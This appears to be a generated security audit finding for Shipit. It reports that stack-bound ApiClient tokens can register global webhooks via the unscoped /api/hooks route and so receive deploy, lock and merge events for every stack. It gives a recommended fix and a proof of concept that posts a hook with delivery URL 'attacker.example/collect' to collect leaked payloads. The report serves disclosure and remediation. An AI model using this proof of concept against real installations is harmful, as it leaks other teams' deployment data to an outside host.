### Title
Stack-scoped ApiClient tokens can read/write cross-stack event data via the unscoped global Hooks endpoint - (File: app/controllers/shipit/api/hooks_controller.rb, app/controllers/shipit/api/base_controller.rb, config/routes.rb)

### Summary
The C4 report describes an adapter that is shared across multiple vaults, where an authorization check (`_verifyCreatorOrOwner`) is bound to the wrong resource (the caller's own vault) and lets that caller act on the shared adapter, impacting every other vault that reuses it. The Shipit analog is `Shipit::Hook`: hooks can be scoped to one `Stack` or left global (`stack_id: nil`), and global hooks receive events for **every** stack. `Api::HooksController` is mounted twice — once nested under `/api/stacks/*stack_id/hooks` and once at the top level `/api/hooks` (`config/routes.rb` lines 43 and 46) — and only the nested route causes `stack_id` to be populated. An `ApiClient` whose authorization is meant to be limited to a single stack (`ApiClient#stack`) can hit the un-nested, un-scoped `/api/hooks` route and create a global `Hook`, because `HooksController` never re-validates that the client is restricted to its own stack when no `stack_id` param is present.

### Finding Description
`ApiClient` can optionally be bound to a single `Stack` (`belongs_to :stack, optional: true`) and `Api::BaseController#stacks` deliberately restricts the client to that stack for every stack-scoped resource: [1](#0-0) 

`Api::HooksController`, however, derives its own scope independently of that restriction: [2](#0-1) 

`stack_id` is only set `if params[:stack_id].present?`. The router exposes two distinct mount points for the same controller — a stack-nested one and a completely unscoped, top-level one: [3](#0-2) 

When a request hits the top-level `/api/hooks` route, `params[:stack_id]` is absent, so `hooks` resolves to `Hook.where(stack_id: nil)` — the **global** hook collection — regardless of which stack (if any) the authenticated `ApiClient` is bound to. The only guard on this controller is the generic `write:hook`/`read:hook` permission check: [4](#0-3) 

These permissions are not stack-qualified in the permission model: [5](#0-4) 

Global hooks are delivered for events on every stack, by design — `Hook.for_stack` matches both the specific stack and `nil` (global) hooks: [6](#0-5) 

`Hook.emit` is invoked from stack lifecycle and task lifecycle code with rich payloads (lock reason/author, deploy/task objects, statuses, merge status, etc.): [7](#0-6) [8](#0-7) 

This breaks the intended binding "a stack a token authorises versus a stack it touches": a client is only supposed to be authorized to act on/observe its own bound `Stack` (as enforced by `BaseController#stacks`/`#stack` for every other nested resource — deploys, rollbacks, locks, tasks, commits), but the Hooks controller lets that same token subscribe to a global webhook and thereby observe lock/deploy/task/commit-status/merge events for every other stack in the installation, including ones it has no permission on.

### Impact Explanation
An `ApiClient` intentionally scoped to a single stack (the equivalent of the attacker's "own vault") is, by design, meant to be limited to `read:stack`/`write:stack`/`deploy:stack`/`lock:stack` operations on that one stack. If it is additionally (or instead) granted `write:hook`, it can register a **global** `Hook`, and thereafter receive `stack`, `lock`, `task`, `deploy`, `rollback`, `commit_status`, `deployable_status`, `merge_status`, `merge`, and `pull_request` events for every stack managed by that Shipit installation — not just the stack it was authorized for. This is an unauthorized cross-stack read of stack state, deploy/task lifecycle information, and lock/merge status for stacks the token holder has no relationship with, matching the "unauthenticated/unauthorized read of stack state, task streams or deploy output" impact class.

### Likelihood Explanation
Exploitation requires only an `ApiClient` token with the `write:hook` permission — no repository write access, no admin role, and no interaction with any specific victim stack is needed. Any Shipit user who can create an `ApiClient` for their own stack (a routine, low-privilege action) and is granted `write:hook` can trigger this; the vulnerable route (`POST /api/hooks`) is reachable with the exact same authentication used for every other stack-scoped call, and no code path re-checks that the token's `stack_id` binding applies before writing to the global hook set.

### Recommendation
In `Api::HooksController`, reject requests to the unscoped (`stack_id`-less) hooks routes when `current_api_client.stack_id?` is true, or otherwise force `stack_id` to `current_api_client.stack_id` whenever the client is stack-scoped, so a stack-bound token can never create, read, update, or delete a global `Hook`. Alternatively, split `write:hook`/`read:hook` into stack-scoped and global-scoped permissions and require the latter only for genuinely unscoped `ApiClient` tokens (`stack_id` nil).

### Proof of Concept
1. As a Shipit user, create a `Stack` `A` you control (e.g. `org/repoA/production`), and generate an `ApiClient` bound to stack `A` with `write:hook` permission (`ApiClient.create!(creator: me, stack: stack_A, permissions: ['write:hook'])`).
2. Using that client's Basic Auth token, call the top-level, unscoped route rather than the nested one:
   `POST /api/hooks` with body `{ "delivery_url": "https://attacker.example/collect", "events": ["deploy", "task", "lock", "commit_status", "merge_status"] }`
   (route resolved by `resources :hooks, only: %i[index create show update destroy]` at the top level of `config/routes.rb`, not the nested `/api/stacks/*stack_id/hooks`).
3. `Api::HooksController#create` computes `stack_id` as `nil` because `params[:stack_id]` is absent, so `Hook.create` persists a **global** hook (`stack_id: nil`), even though the authenticating `ApiClient` is bound only to stack `A`.
4. Any subsequent deploy/rollback/task/lock/commit-status/merge event on any other stack `B` in the installation (`Hook.emit` → `Hook.for_stack(stack_B.id).listening_event(...)` matches the global hook because `for_stack` scope includes `stack_id: nil`) is now POSTed with full event payload to `https://attacker.example/collect`, leaking stack `B`'s state to a holder of a token that was only ever authorized for stack `A`.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
